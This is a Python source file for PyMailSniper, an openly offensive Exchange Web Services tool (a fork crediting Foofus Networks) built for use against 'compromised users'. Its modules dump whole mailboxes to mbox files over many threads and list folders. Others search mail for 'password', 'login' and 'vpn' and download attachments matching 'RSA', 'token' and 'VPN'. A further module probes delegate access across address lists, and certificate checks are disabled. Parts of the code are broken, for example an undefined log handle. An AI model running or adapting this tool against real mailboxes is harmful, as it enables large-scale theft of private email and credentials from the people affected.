#!/usr/bin/env python3
import re
from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
    NoVerifyHTTPAdapter, Message, Q, FaultTolerance
from exchangelib.errors import UnauthorizedError, CASError
import mailbox
import requests
import mailbox
import argparse
import sys
import logging
import os
from os.path import isfile
import math
import tqdm
import time
import getpass
import threading
import urllib3

messages_per_thread = None

# ignore certificate errors and suspend warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter


def loggerCreate(params):
    logger = logging.getLogger('pymailsniper')
    logger.setLevel(logging.DEBUG)

    # Output response to a File
    filename = logging.FileHandler(params.get("output"))
    filename.setLevel(logging.DEBUG)
    logger.addHandler(filename)

    # Output response to Screen
    screenOutput = logging.StreamHandler(sys.stdout)
    screenOutput.setLevel(logging.DEBUG)
    logger.addHandler(screenOutput)

    return logger


# Function to setup an Exchangelib Account object to be used throughout the code
def acctSetup(params):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')
    shared = params.get('delegated')

    try:
        config = Configuration(
            server=server, credentials=Credentials(email, password), retry_policy=FaultTolerance(max_wait=3),
            max_connections=2)

        if params.get('delegated'):
            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)
        else:
            account = Account(primary_smtp_address=email,
                              autodiscover=False, config=config, access_type=DELEGATE)

        return account
    except Exception as e:
        print(f'[!] Error while connecting:\n{e}')


# List folders from a users inbox
def print_folders(accountObject, tree_view=False, count=False, root=False):
    root_folder = accountObject.root if root else accountObject.msg_folder_root
    # 'Top of Information Store'

    print('[+] Folder List for Compromised Users' + '\n')

    if tree_view and not count:
        print(root_folder.tree())
        print("\n[=] Done\n")
        return
    elif tree_view and count:
        tree = root_folder.tree()  # .split("\n")
    if tree_view and count:
        for folder_object in root_folder.walk():
            folder_childs = f' (folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
            # tree = tree.replace(folder_object.name + "\n", "{:50s} {}\n".format(folder_object.name, folder_childs))
            regex = f"(?<=(\n)).*({folder_object.name.replace('?', '.')})\n"

            try:
                result = re.search(regex, tree).group(0)
                tree = tree.replace(result, "{:50s} {}\n".format(result[:-1], folder_childs))
            except Exception as e:
                pass

        print(tree)
        print("\n[=] Done\n")
        return

    if not tree_view:
        for folder_object in root_folder.walk():
            info_to_print = ""

            if count:
                folder_childs = f'(folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'

            info_to_print += folder_object.absolute
            print("{:28s} {}".format(folder_childs, info_to_print))
        print("\n[=] Done\n")


# Search users email for specified terms
def searchEmail(accountObject, params, loghandle):
    folder = params.get("folder")  # по умолчанию Inbox почему-то
    terms = params.get("terms")
    count = params.get("count")
    filtered_emails = list()

    mbox = mailbox.mbox("./emails.mbox")
    mbox.lock()

    if len(terms) > 1:
        termList = terms.split(',')
    elif type(terms) == list:
        termList = terms[0].split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        # searchFolder = accountObject.root / 'Top of Information Store' / folder
        searchFolder = accountObject.inbox  # root / 'Корневой уровень хранилища'

    if params.get('field') == 'body':
        print(
            '[+] Searching Email body for {} in {} Folder [+]'.format(terms, folder) + '\n')
        for term in termList:
            filtered_emails.append(searchFolder.all().filter(body__contains=term)[:count])
    else:
        print(
            '[+] Searching Email Subject for {} in {} Folder [+]'.format(terms, folder) + '\n')
        for term in termList:
            filtered_emails.append(searchFolder.all().filter(body__contains=term))

    # TODO: Разобраться с кодировками и нормально доставать email.text_body или email.unique_body

    for filtered_email in filtered_emails:
        for email in filtered_email:
            msg = mailbox.mboxMessage(email.mime_content)
            mbox.add(msg)
            mbox.flush()

    mbox.unlock()


# Search for attachments based on search terms provided
def searchAttachments(accountObject, params):
    folder = params.get("folder")
    terms = params.get("terms")
    count = params.get("count")

    if len(terms) > 1:
        termList = terms.split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        searchFolder = accountObject.root / 'Top of Information Store' / folder
    if params.get("field") == 'body':
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)[:count]
    else:
        for term in termList:
            searchResult = searchFolder.filter(subject__contains=term)[:count]

    print('[+] Attachment List for Compromised Users with search term {} in {} Folder'.format(terms, folder) + '\n')
    if params.get("directory"):
        print('[+] Saving Attachments [+]')
    for emails in searchResult:
        for attachment in emails.attachments:
            print('From: {} | Subject: {} | Attachment: {}'.format(
                emails.author.email_address, emails.subject, attachment.name))
            if params.get("directory"):
                if isinstance(attachment, FileAttachment):
                    local_path = os.path.join(
                        params.get("directory"), attachment.name)
                    with open(local_path, 'wb') as f, attachment.fp as fp:
                        buffer = fp.read(1024)
                        while buffer:
                            f.write(buffer)
                            buffer = fp.read(1024)
    print('\n' + 'Saved attachment to', params.get("directory"))


# Check where compromised user has delegation rights
def searchDelegates(params, fparser):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')

    if isinstance(fparser.get("galList"), (str)):
        fname = ''.join(fparser.get("galList"))
        fname = fname.split(' ')
    else:
        fname = fparser.get("galList")

    print('[+] Checking Where Compromised User Has Access' + '\n')

    for shared in fname:
        try:
            config = Configuration(
                server=server, credentials=Credentials(email, password))

            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)

            folderInbox = account.inbox
            # print(folderInbox.permission_set)
            for s in folderInbox.permission_set.permissions:
                if s.permission_level != 'None':
                    print('User: {} has {} permissions on {}\'s Inbox'.format(email, s.permission_level, shared))

        except Exception as e:
            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(
                    e):
                print(e)


# This is where we check if the address list file provided exists
def file_parser(params):
    return_dict = {}

    if isfile(params.get("galList")):
        with open(params.get("galList", "r")) as f:
            userfile_content = f.read().splitlines()
            f.close()
            return_dict['galList'] = userfile_content
    elif isinstance(params.get("galList"), str):
        return_dict['galList'] = params.get("galList")
    else:
        print("GAL File not found!")

    return return_dict


def print_logo():
    logo = '''
  _____       __  __       _ _  _____       _                 
 |  __ \     |  \/  |     (_) |/ ____|     (_)                
 | |__) |   _| \  / | __ _ _| | (___  _ __  _ _ __   ___ _ __ 
 |  ___/ | | | |\/| |/ _` | | |\___ \| '_ \| | '_ \ / _ \ '__|
 | |   | |_| | |  | | (_| | | |____) | | | | | |_) |  __/ |   
 |_|    \__, |_|  |_|\__,_|_|_|_____/|_| |_|_| .__/ \___|_|   
         __/ |                               | |              
        |___/                                |_|              
        
   '''

    print(logo)


def findFolder(accountObject=None, folder_to_find=None):
    found = list(accountObject.msg_folder_root.glob(folder_to_find))[0]
    return found
    # for folder in accountObject.msg_folder_root.walk():
    #     if folder.name.lower() == folder_to_find.lower():
    #         return folder
    # else:
    #     return None


def sanitaze_file_path(file_path=None):
    return re.sub(r"[^\sа-яА-ЯёЁ0-9a-zA-Z\]\[]+", " ", file_path)


def dump_to_Mbox(folder_name=None, mbox_file_path=None, messages_from_threads=[]):
    try:
        # look at this magic (list of lists into flat list)
        messages_from_threads = [item for sublist in messages_from_threads for item in sublist]

        mbox = mailbox.mbox(mbox_file_path)
        mbox.lock()
        desc = f"[+] Saving folder \"{folder_name}\""
        for message_index in tqdm.tqdm(range(len(messages_from_threads)), desc=desc, leave=False, unit="email"):
            msg = mailbox.mboxMessage(messages_from_threads[message_index])
            mbox.add(msg)
            mbox.flush()
        mbox.unlock()
    except Exception as e:
        print(f"[-] Error while saving {folder_name} to {mbox_file_path}:")
        print(e)
    finally:
        size = os.path.getsize(mbox_file_path)
        size = size / (1024 * 1024)
        info = "({} emails {:.3f} MB)".format(str(len(messages_from_threads)), size)
        print("[+] Folder {:25s} dumped to {} {:>18}".format('"' + folder_name + '"', mbox_file_path, info))


def get_emails(accountObject=None, items_list=None, folder_name=None, thread_index=None, params=None):
    global messages_per_thread
    messages = []
    # you can try with this parameter for perfomance:
    # but in my case by one is fastest
    count_per_task = 1

    if folder_name:
        desc = f"[+] Downloading \"{folder_name}\""
        if params.get('threads') != 1:
            desc += f' (Thr №{thread_index})'
    else:
        desc = ""

    for i in tqdm.tqdm(range(0, len(items_list), count_per_task), desc=desc, leave=False, unit="email"):
        # takes list of N ids of emails and downloading its mime (plain .eml file)
        # while True:
        while True:
            try:

                temp = items_list[i:i + count_per_task]
                for mime in accountObject.fetch(temp, only_fields=['mime_content']):
                    messages.append(mime.mime_content)
                break

            except Exception as e:
                # accountObject = acctSetup(params)
                # print(e)
                print(f"[!] Thread {thread_index} is reconnected!")
                continue

    messages_per_thread[thread_index] = messages
    accountObject.protocol.close()

    return 0


def dumper(accountObject=None, params=None):
    # брать папку из аргументов если dump all -d "папка куда"

    base_folder = None
    folder_to_dump = params.get('folder')
    local_folder = params.get('dump_folder')
    emails_count = params.get('count')

    if folder_to_dump.lower() == "inbox":
        base_folder = accountObject.inbox
    elif folder_to_dump.lower() == "sent":
        base_folder = accountObject.sent
    elif folder_to_dump.lower() == "all":
        base_folder = accountObject.msg_folder_root
    else:
        base_folder = findFolder(accountObject=accountObject, folder_to_find=folder_to_dump)
        if not base_folder:
            print(f"\n[-] Folder {local_folder} not found")
            return 1

    if os.path.isdir(local_folder):
        print(f"\n[-] Folder {local_folder} allready exists, use another (-d)")
        return 1
    else:
        try:
            os.mkdir(local_folder)
            print(f"\n[+] Folder \"{local_folder}\" created")
        except Exception as e:
            print(f"\n[-] Something went wrong while creating {local_folder}:")
            print(e)
            return 1

    all_folders_2_dump = [base_folder]
    all_folders_2_dump += [folder for folder in base_folder.walk()]
    # to-do : filter folders without emails like calendar

    for folder in all_folders_2_dump:
        # If messages in folder are present:
        if folder.total_count == 0:
            continue

        global messages_per_thread

        thread_count = params.get('threads')

        mbox_file_path = (folder.absolute).replace(base_folder.absolute + "/", "")
        mbox_file_path = "[" + folder.parent.name + "] " if folder.parent.name not in [base_folder.name,
                                                                                       accountObject.msg_folder_root.name] else ""
        mbox_file_path += folder.name
        mbox_file_path = sanitaze_file_path(mbox_file_path)
        mbox_file_path = f"./{local_folder}/{mbox_file_path}.mbox"

        threads_lists = []

        messages_per_thread = [[]] * thread_count

        # just IDs of emails in folder

        if not emails_count:
            emails_count = folder.total_count

        all_items = list(
            folder.all().order_by('-datetime_received').values_list('id', 'changekey')[:emails_count])

        if len(all_items) == 0:
            continue

        messages_count_per_thread = int(math.ceil(len(all_items) / thread_count))

        items_per_thread = []

        # its really better
        if len(all_items) <= 10:
            thread_count = 1

        # emails_count - 1 is eq to len(all_items)
        for i in range(0, emails_count - 1, messages_count_per_thread):
            items_per_thread.append(all_items[i:i + messages_count_per_thread])

        accountObjects = [None] * thread_count

        for index in range(thread_count):
            # one connection per thread
            if len(items_per_thread[index]) == 0:
                continue
            accountObjects[index] = acctSetup(parsed_arguments)
            t = threading.Thread(target=get_emails,
                                 kwargs={'accountObject': accountObjects[index],
                                         'items_list': items_per_thread[index],
                                         'folder_name': folder.name, 'thread_index': index, 'params': params})
            threads_lists.append(t)
            t.start()

        for t in threads_lists:
            t.join()

        # messages = get_emails(accountObject=accountObject, items_list=items, folder_name=base_folder.name)
        dump_to_Mbox(folder_name=folder.name, mbox_file_path=mbox_file_path,
                     messages_from_threads=messages_per_thread)

    print("\n[=] All folders downloaded")


if __name__ == "__main__":
    # This is where we start parsing arguments
    banner = "# PyMailSniper [http://www.foofus.net] (C) sph1nx Foofus Networks <sph1nx@foofus.net>"
    banner += "\n# Fork By HydroSausager\n"

    print_logo()
    print(banner)
    parser = argparse.ArgumentParser(description='Python implementation of mailsniper',
                                     usage='python3 pymailsniper.py module [options]')

    subparsers = parser.add_subparsers(
        title='Modules', dest='modules', description='available modules')

    optional_parser = argparse.ArgumentParser(add_help=False)
    optional_parser.add_argument('-s', '--remote-server', action="store",
                                 dest="server", help='EWS URL for Mail Server')
    optional_parser.add_argument('-e', '--email', action="store",
                                 dest="email", help='Email address of compromised user')
    optional_parser.add_argument('-p', '--password', action="store",
                                 dest="password", help='Password, leave empty for prompt')

    folder_parser = subparsers.add_parser(
        'folders', help="List Mailbox Folders", parents=[optional_parser])
    folder_parser.add_argument('-a', '--absolute', action='store_true', default=False,
                               help='Print folders absolute paths instead tree if arg is present')
    folder_parser.add_argument('-c', '--count', action='store_true', default=False,
                               help='Print count of child folders and email if present')
    folder_parser.add_argument('-r', '--root', action='store_true', default=False,
                               help='Use "root" folder as root for printing insted of "Top Information Store"')

    dump_parser = subparsers.add_parser(
        'dump', help="Download emails", parents=[optional_parser])
    dump_parser.add_argument('folder', action='store', default="Inbox",
                             help='Folder to dump')
    dump_parser.add_argument('-d', '--dump-folder', action='store', default="dump",
                             help='Local folder to store .mbox dumps')
    dump_parser.add_argument('-c', '--count', action='store', default=None, type=int,
                             help='Count of N last emails in folder to dump')
    dump_parser.add_argument('-t', '--threads', action='store', default="1", type=int,
                             help='Threads count')

    attach_parser = subparsers.add_parser(
        'attachment', help="List/Download Attachments", parents=[optional_parser])
    attach_parser.add_argument('-d', '--directory', action="store",
                               dest="directory", help='Directory to download attachments', metavar=' ')
    attach_parser.add_argument('-t', '--terms', action="store",
                               dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
                               nargs='+', type=str, default='RSA,token,VPN')
    attach_parser.add_argument('-f', '--folder', action="store",
                               dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
    attach_parser.add_argument('-c', '--count', action="store",
                               dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    attach_parser.add_argument('--field', action="store",
                               dest="field", help='Email field to search. Default is subject',
                               choices=['subject', 'body'])

    delegate_parser = subparsers.add_parser(
        'delegation', help="Find where compromised user has access", parents=[optional_parser])
    delegate_parser.add_argument('-g', '--gal', action="store",
                                 dest="galList", metavar=' ', help='List of email addresses to check access',
                                 required=True)

    email_parser = subparsers.add_parser('emails', help="Search for Emails", parents=[optional_parser])
    email_parser.add_argument('-f', '--folder', action="store", dest="folder", metavar=' ',
                              help='Folder to search through', default='Inbox')
    email_parser.add_argument('-t', '--terms', action="store",
                              dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
                              nargs='+', type=str, default='password,login,vpn')
    email_parser.add_argument('-c', '--count', action="store",
                              dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    email_parser.add_argument('--field', action="store",
                              dest="field", help='Email field to search. Default is subject',
                              choices=['subject', 'body'])
    email_parser.add_argument('--delegated', action="store",
                              dest="delegated", help='Mailbox with access')
    email_parser.add_argument('-o', '--output', action="store",
                              dest="output", metavar=' ', help='Filename to save emails', required=True)

    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    print(f"[+] Email - {args.email}, server - {args.server}")

    if not args.password:
        args.password = getpass.getpass(prompt='Password: ', stream=None)

    parsed_arguments = vars(args)  # Convert Args to a Dictionary
    if parsed_arguments.get("galList"):
        fileparser = file_parser(parsed_arguments)

    # if parsed_arguments.get("output"):
    #     loghandle = loggerCreate(parsed_arguments)
    accountObj = acctSetup(parsed_arguments)

    if accountObj is None:
        print('[=] Could not connect to MailBox\n\n')
        sys.exit()

    start_time = time.time()

    if parsed_arguments['modules'] == 'folders':
        print_folders(accountObj, tree_view=not args.absolute, count=args.count, root=args.root)
    elif parsed_arguments['modules'] == 'dump':
        dumper(accountObj, params=parsed_arguments)
        # folder_to_dump=args.folder, local_folder=args.dump_folder, emails_count=args.count,
        # thread_count=args.threads)
    elif parsed_arguments['modules'] == 'emails':
        searchEmail(accountObj, parsed_arguments, loghandle)
    elif parsed_arguments['modules'] == 'attachment':
        searchAttachments(accountObj, parsed_arguments)
    elif parsed_arguments['modules'] == 'delegation':
        searchDelegates(parsed_arguments, fileparser)

    print("[=] Took time: {:.3f} min\n\n".format((time.time() - start_time) / 60))

# to-do get file sizes
